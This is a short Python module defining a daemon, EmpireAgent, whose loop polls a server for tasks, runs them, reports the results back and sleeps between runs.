# -*- coding: utf-8 -*-

from . import command
from . import config
from . import db
from . import log
from . import network
from . import security
from .system import *

from time import sleep

def launch(config):
    interval = config.interval
    tasks = Task(config)

    while True:
        # update from server
        tasks.get_updates() # check whether have new updates

        # run tasks
        # run all task (including old tasks) & save result
        tasks.handle_tasks()

        # send result to center
        tasks.send_back_result()

        # set interval for next run
        interval = tasks.get_interval()
        tasks.set_interval(interval)
        tasks.sleep()

class EmpireAgent(system.daemon.Daemon):
    def run(self, config):
        launch(config)